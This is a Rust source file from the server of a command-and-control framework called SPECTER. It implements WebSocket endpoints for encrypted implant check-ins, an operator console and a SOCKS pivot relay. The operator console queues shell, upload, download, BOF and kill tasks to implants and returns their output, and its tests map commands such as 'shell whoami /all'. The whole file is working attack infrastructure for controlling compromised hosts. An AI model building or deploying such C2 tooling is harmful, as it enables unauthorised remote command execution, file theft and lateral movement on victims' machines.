//! WebSocket upgrade handler for the HTTP listener.
//!
//! Adds WebSocket upgrade support to the existing HTTP listener so that
//! implants using the WebSocket channel can connect. Uses axum's built-in
//! WebSocket extraction to handle the HTTP Upgrade handshake, then processes
//! binary frames as encrypted check-in messages (same wire format as /api/beacon).

use axum::extract::ws::{Message, WebSocket};
use axum::extract::{Path, State, WebSocketUpgrade};
use axum::response::IntoResponse;

use base64::{engine::general_purpose, Engine as _};
use chacha20poly1305::aead::{Aead, KeyInit};
use chacha20poly1305::{ChaCha20Poly1305, Nonce};
use serde::{Deserialize, Serialize};
use specter_common::proto::specter::v1::{Task, TaskPriority, TaskStatus};
use tokio::sync::broadcast;
use tokio::time::{timeout, Duration};

use super::checkin_processor::{
    parse_plaintext_checkin, process_checkin, CheckinOptions, SessionBinding,
};
use super::HttpState;
use crate::event::SpecterEvent;

// Wire protocol constants (same as beacon handler)
const WIRE_LEN_SIZE: usize = 4;
const WIRE_IMPLANT_ID_SIZE: usize = 12;
const WIRE_NONCE_SIZE: usize = 12;
const WIRE_HEADER_SIZE: usize = WIRE_IMPLANT_ID_SIZE + WIRE_NONCE_SIZE;
const WIRE_TAG_SIZE: usize = 16;
const BEACON_MIN_SIZE: usize = WIRE_LEN_SIZE + WIRE_HEADER_SIZE + WIRE_TAG_SIZE;
const OPERATOR_COMMAND_TIMEOUT: Duration = Duration::from_secs(300);

const BUILTIN_TASKS: &[&str] = &[
    "sleep",
    "kill",
    "cd",
    "pwd",
    "upload",
    "download",
    "upload_chunk",
    "download_chunk",
    "bof",
    "shell",
];

#[derive(Debug, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum OperatorInbound {
    Command {
        command: String,
        operator_id: Option<String>,
    },
}

#[derive(Debug, Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum OperatorOutbound {
    Ready {
        session_id: String,
    },
    Queued {
        task_id: String,
        task_type: String,
        command: String,
    },
    Result {
        task_id: String,
        task_type: String,
        status: String,
        result: String,
        result_b64: String,
    },
    Error {
        message: String,
    },
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OperatorTaskCommand {
    pub task_type: String,
    pub arguments: Vec<u8>,
}

/// Axum handler for WebSocket upgrade requests.
/// The implant sends an HTTP Upgrade request with Sec-WebSocket-Key;
/// axum validates the handshake and calls our handler with an active WebSocket.
pub async fn ws_upgrade_handler(
    ws: WebSocketUpgrade,
    State(state): State<HttpState>,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| handle_ws_connection(socket, state))
}

/// Operator-facing WebSocket for a single session command stream.
///
/// This is intentionally separate from `/api/ws`, which remains an implant
/// transport endpoint. Incoming text frames queue normal SPECTER tasks; task
/// completion is delivered back over the socket when the implant reports it.
pub async fn operator_session_ws_handler(
    ws: WebSocketUpgrade,
    Path(session_id): Path<String>,
    State(state): State<HttpState>,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| handle_operator_session(socket, state, session_id))
}

/// Implant-facing SOCKS interactive channel.
///
/// Binary frames on this socket are raw SOCKS_MSG frames from the socks5
/// module. Binary frames sent back to the socket are raw SOCKS_MSG frames
/// produced by the local SOCKS relay. This keeps SOCKS traffic off the normal
/// beacon/task result channel while preserving the same module wire format.
pub async fn socks_session_ws_handler(
    ws: WebSocketUpgrade,
    Path(session_id): Path<String>,
    State(state): State<HttpState>,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| handle_socks_session(socket, state, session_id))
}

async fn handle_socks_session(mut socket: WebSocket, state: HttpState, session_id: String) {
    let Some(socks_manager) = state.socks_manager.as_ref().cloned() else {
        let _ = socket.close().await;
        return;
    };

    let mut outbound_rx = match socks_manager.attach_interactive_channel(&session_id).await {
        Ok(rx) => rx,
        Err(e) => {
            tracing::debug!("SOCKS WebSocket rejected for {session_id}: {e}");
            let _ = socket.close().await;
            return;
        }
    };

    tracing::info!("SOCKS interactive WebSocket attached for session {session_id}");

    let close_reason = loop {
        tokio::select! {
            maybe_msg = socket.recv() => {
                let Some(msg) = maybe_msg else {
                    break "client disconnected".to_string();
                };
                let msg = match msg {
                    Ok(msg) => msg,
                    Err(e) => {
                        break format!("recv error: {e}");
                    }
                };

                match msg {
                    Message::Binary(data) => {
                        socks_manager.route_message(&session_id, &data).await;
                    }
                    Message::Ping(payload) => {
                        if socket.send(Message::Pong(payload)).await.is_err() {
                            break "pong send failed".to_string();
                        }
                    }
                    Message::Close(frame) => {
                        break match frame {
                            Some(frame) => format!(
                                "client close code={} reason={}",
                                u16::from(frame.code),
                                frame.reason
                            ),
                            None => "client close".to_string(),
                        };
                    }
                    _ => {}
                }
            }
            outbound = outbound_rx.recv() => {
                let Some(frame) = outbound else {
                    break "relay outbound channel closed".to_string();
                };
                if socket.send(Message::Binary(frame)).await.is_err() {
                    break "binary send failed".to_string();
                }
            }
        }
    };

    socks_manager.detach_interactive_channel(&session_id).await;
    tracing::info!(
        "SOCKS interactive WebSocket detached for session {session_id}: {close_reason}"
    );
}

async fn handle_operator_session(mut socket: WebSocket, state: HttpState, session_id: String) {
    match state.session_manager.get_session(&session_id).await {
        Ok(Some(_)) => {}
        Ok(None) => {
            let _ = send_operator_json(
                &mut socket,
                &OperatorOutbound::Error {
                    message: "session not found".to_string(),
                },
            )
            .await;
            let _ = socket.close().await;
            return;
        }
        Err(e) => {
            let _ = send_operator_json(
                &mut socket,
                &OperatorOutbound::Error {
                    message: format!("session lookup failed: {e}"),
                },
            )
            .await;
            let _ = socket.close().await;
            return;
        }
    }

    if send_operator_json(
        &mut socket,
        &OperatorOutbound::Ready {
            session_id: session_id.clone(),
        },
    )
    .await
    .is_err()
    {
        return;
    }

    while let Some(msg) = socket.recv().await {
        let msg = match msg {
            Ok(m) => m,
            Err(e) => {
                tracing::debug!("operator WebSocket recv error: {e}");
                break;
            }
        };

        match msg {
            Message::Text(text) => {
                let inbound = match serde_json::from_str::<OperatorInbound>(&text) {
                    Ok(inbound) => inbound,
                    Err(e) => {
                        let _ = send_operator_json(
                            &mut socket,
                            &OperatorOutbound::Error {
                                message: format!("invalid command frame: {e}"),
                            },
                        )
                        .await;
                        continue;
                    }
                };

                match inbound {
                    OperatorInbound::Command {
                        command,
                        operator_id,
                    } => {
                        if let Err(e) = queue_and_stream_operator_command(
                            &mut socket,
                            &state,
                            &session_id,
                            &command,
                            operator_id.as_deref().unwrap_or("web"),
                        )
                        .await
                        {
                            let _ = send_operator_json(
                                &mut socket,
                                &OperatorOutbound::Error { message: e },
                            )
                            .await;
                        }
                    }
                }
            }
            Message::Ping(payload) => {
                if socket.send(Message::Pong(payload)).await.is_err() {
                    break;
                }
            }
            Message::Close(_) => break,
            _ => {}
        }
    }
}

async fn queue_and_stream_operator_command(
    socket: &mut WebSocket,
    state: &HttpState,
    session_id: &str,
    command: &str,
    operator_id: &str,
) -> Result<(), String> {
    let mapped = map_operator_command(command)?;
    let mut events = state.event_bus.subscribe();
    let task_id = state
        .task_dispatcher
        .queue_task(
            session_id,
            &mapped.task_type,
            &mapped.arguments,
            TaskPriority::Normal,
            operator_id,
        )
        .await
        .map_err(|e| format!("queue task failed: {e}"))?;

    send_operator_json(
        socket,
        &OperatorOutbound::Queued {
            task_id: task_id.clone(),
            task_type: mapped.task_type.clone(),
            command: command.to_string(),
        },
    )
    .await
    .map_err(|e| format!("send queued frame failed: {e}"))?;

    let task = wait_for_task_result(&mut events, state, &task_id).await?;
    let status = task_status_label(task.status);
    let result = String::from_utf8_lossy(&task.result).to_string();
    let result_b64 = general_purpose::STANDARD.encode(&task.result);

    send_operator_json(
        socket,
        &OperatorOutbound::Result {
            task_id: task.id,
            task_type: task.task_type,
            status,
            result,
            result_b64,
        },
    )
    .await
    .map_err(|e| format!("send result frame failed: {e}"))?;

    Ok(())
}

pub fn map_operator_command(command: &str) -> Result<OperatorTaskCommand, String> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Err("empty command".to_string());
    }

    let mut parts = trimmed.splitn(2, char::is_whitespace);
    let head = parts.next().unwrap_or_default().to_ascii_lowercase();
    let tail = parts.next().unwrap_or_default().trim();

    if head == "module_load" || head == "load_module" {
        return Err(
            "module_load requires module packaging; use the Modules page or module-specific commands"
                .to_string(),
        );
    }

    if BUILTIN_TASKS.contains(&head.as_str()) {
        Ok(OperatorTaskCommand {
            task_type: head,
            arguments: tail.as_bytes().to_vec(),
        })
    } else {
        Err(format!(
            "unknown command '{head}'. Use 'shell {trimmed}' to run an OS command explicitly"
        ))
    }
}

async fn wait_for_task_result(
    events: &mut broadcast::Receiver<SpecterEvent>,
    state: &HttpState,
    task_id: &str,
) -> Result<Task, String> {
    let wait = async {
        loop {
            match events.recv().await {
                Ok(SpecterEvent::TaskComplete(event)) | Ok(SpecterEvent::TaskFailed(event)) => {
                    if let Some(task) = event.task {
                        if task.id == task_id {
                            return Ok(task);
                        }
                    }
                }
                Ok(_) => {}
                Err(broadcast::error::RecvError::Lagged(_)) => {
                    if let Some(task) = completed_task_snapshot(state, task_id).await? {
                        return Ok(task);
                    }
                }
                Err(broadcast::error::RecvError::Closed) => {
                    return Err("event stream closed before task completed".to_string());
                }
            }
        }
    };

    match timeout(OPERATOR_COMMAND_TIMEOUT, wait).await {
        Ok(result) => result,
        Err(_) => match completed_task_snapshot(state, task_id).await? {
            Some(task) => Ok(task),
            None => Err(format!("task {task_id} did not complete before timeout")),
        },
    }
}

async fn completed_task_snapshot(state: &HttpState, task_id: &str) -> Result<Option<Task>, String> {
    let task = state
        .task_dispatcher
        .get_task(task_id)
        .await
        .map_err(|e| format!("task lookup failed: {e}"))?;
    Ok(task.filter(|task| {
        task.status == TaskStatus::Complete as i32 || task.status == TaskStatus::Failed as i32
    }))
}

async fn send_operator_json(
    socket: &mut WebSocket,
    msg: &OperatorOutbound,
) -> Result<(), axum::Error> {
    let text = serde_json::to_string(msg).unwrap_or_else(|_| {
        "{\"type\":\"error\",\"message\":\"failed to serialize response\"}".to_string()
    });
    socket.send(Message::Text(text)).await
}

fn task_status_label(status: i32) -> String {
    if status == TaskStatus::Complete as i32 {
        "complete".to_string()
    } else if status == TaskStatus::Failed as i32 {
        "failed".to_string()
    } else if status == TaskStatus::Dispatched as i32 {
        "dispatched".to_string()
    } else if status == TaskStatus::Queued as i32 {
        "queued".to_string()
    } else {
        "unknown".to_string()
    }
}

/// Handle an active WebSocket connection.
/// Each binary frame is treated as an encrypted beacon message.
async fn handle_ws_connection(mut socket: WebSocket, state: HttpState) {
    tracing::debug!("WebSocket connection established");

    while let Some(msg) = socket.recv().await {
        let msg = match msg {
            Ok(m) => m,
            Err(e) => {
                tracing::debug!("WebSocket recv error: {e}");
                break;
            }
        };

        match msg {
            Message::Binary(data) => {
                let response = process_ws_beacon(&data, &state).await;
                match response {
                    Some(resp_data) => {
                        if socket.send(Message::Binary(resp_data)).await.is_err() {
                            break;
                        }
                    }
                    None => {
                        // Send empty ack
                        if socket.send(Message::Binary(vec![])).await.is_err() {
                            break;
                        }
                    }
                }
            }
            Message::Ping(payload) => {
                if socket.send(Message::Pong(payload)).await.is_err() {
                    break;
                }
            }
            Message::Close(_) => {
                tracing::debug!("WebSocket close received");
                break;
            }
            _ => {
                // Ignore text and other frame types
            }
        }
    }

    tracing::debug!("WebSocket connection closed");
}

/// Process a binary WebSocket frame as an encrypted beacon message.
/// Same wire format as the HTTP /api/beacon endpoint.
async fn process_ws_beacon(data: &[u8], state: &HttpState) -> Option<Vec<u8>> {
    if data.len() < BEACON_MIN_SIZE {
        tracing::debug!("WebSocket beacon too short: {} bytes", data.len());
        return None;
    }

    // Parse wire format: [4-byte LE length][12-byte implant_id][12-byte nonce][ciphertext][16-byte tag]
    let wire_len = u32::from_le_bytes([data[0], data[1], data[2], data[3]]) as usize;

    if data.len() < WIRE_LEN_SIZE + wire_len {
        return None;
    }

    let implant_id_prefix = &data[WIRE_LEN_SIZE..WIRE_LEN_SIZE + WIRE_IMPLANT_ID_SIZE];
    let nonce_bytes = &data[WIRE_LEN_SIZE + WIRE_IMPLANT_ID_SIZE..WIRE_LEN_SIZE + WIRE_HEADER_SIZE];

    let ct_len = wire_len.saturating_sub(WIRE_HEADER_SIZE + WIRE_TAG_SIZE);
    let ct_start = WIRE_LEN_SIZE + WIRE_HEADER_SIZE;
    let ct_end = ct_start + ct_len;
    let tag_start = ct_end;
    let tag_end = tag_start + WIRE_TAG_SIZE;

    if tag_end > data.len() {
        return None;
    }

    let ciphertext = &data[ct_start..ct_end];
    let tag = &data[tag_start..tag_end];

    // Derive session key using the same approach as the beacon handler
    let (session_key, _session_id, implant_pubkey) =
        super::derive_session_key(state, implant_id_prefix)
            .await
            .ok()?;

    // Decrypt
    let cipher = ChaCha20Poly1305::new_from_slice(&session_key).ok()?;
    let nonce = Nonce::from_slice(nonce_bytes);

    let mut ct_with_tag = Vec::with_capacity(ct_len + WIRE_TAG_SIZE);
    ct_with_tag.extend_from_slice(ciphertext);
    ct_with_tag.extend_from_slice(tag);

    let plaintext = cipher.decrypt(nonce, ct_with_tag.as_slice()).ok()?;

    tracing::debug!(
        "WebSocket beacon from implant {:02x?}",
        &implant_id_prefix[..4]
    );

    let parsed = parse_plaintext_checkin(&plaintext)?;
    let binding = match _session_id {
        Some(id) => SessionBinding::Existing(id),
        None => SessionBinding::ImplantPubkey(implant_pubkey),
    };

    let processed = process_checkin(
        state,
        parsed.request,
        parsed.is_binary,
        binding,
        CheckinOptions {
            defer_module_payloads: false,
        },
    )
    .await
    .ok()?;

    let response_payload = processed.response_bytes().ok()?;

    let resp_nonce_bytes: [u8; 12] = rand::random();
    let resp_nonce = Nonce::from_slice(&resp_nonce_bytes);
    let encrypted = cipher
        .encrypt(resp_nonce, response_payload.as_slice())
        .ok()?;

    // Build wire response
    let ct_part_len = encrypted.len() - WIRE_TAG_SIZE;
    let resp_ct = &encrypted[..ct_part_len];
    let resp_tag = &encrypted[ct_part_len..];

    let server_pub_bytes = state.server_pubkey.as_bytes();
    let resp_total = WIRE_HEADER_SIZE + resp_ct.len() + WIRE_TAG_SIZE;

    let mut wire_resp = Vec::with_capacity(WIRE_LEN_SIZE + resp_total);
    wire_resp.extend_from_slice(&(resp_total as u32).to_le_bytes());
    wire_resp.extend_from_slice(&server_pub_bytes[..WIRE_IMPLANT_ID_SIZE]);
    wire_resp.extend_from_slice(&resp_nonce_bytes);
    wire_resp.extend_from_slice(resp_ct);
    wire_resp.extend_from_slice(resp_tag);

    Some(wire_resp)
}

#[cfg(test)]
mod tests {
    use super::map_operator_command;

    #[test]
    fn maps_explicit_shell_command_to_shell_task() {
        let mapped = map_operator_command("shell whoami /all").expect("command should map");

        assert_eq!(mapped.task_type, "shell");
        assert_eq!(mapped.arguments, b"whoami /all");
    }

    #[test]
    fn rejects_unknown_operator_command() {
        let err = map_operator_command("whoami /all").expect_err("unknown should fail");

        assert!(err.contains("Use 'shell whoami /all'"));
    }

    #[test]
    fn rejects_raw_module_load_from_operator_console() {
        let err = map_operator_command("module_load socks5 start")
            .expect_err("raw module load should fail");

        assert!(err.contains("requires module packaging"));
    }

    #[test]
    fn maps_builtin_command_to_task_type_and_tail_arguments() {
        let mapped = map_operator_command(r"cd C:\Temp").expect("command should map");

        assert_eq!(mapped.task_type, "cd");
        assert_eq!(mapped.arguments, br"C:\Temp");
    }

    #[test]
    fn rejects_empty_operator_command() {
        let err = map_operator_command("   ").expect_err("empty command should fail");

        assert_eq!(err, "empty command");
    }
}
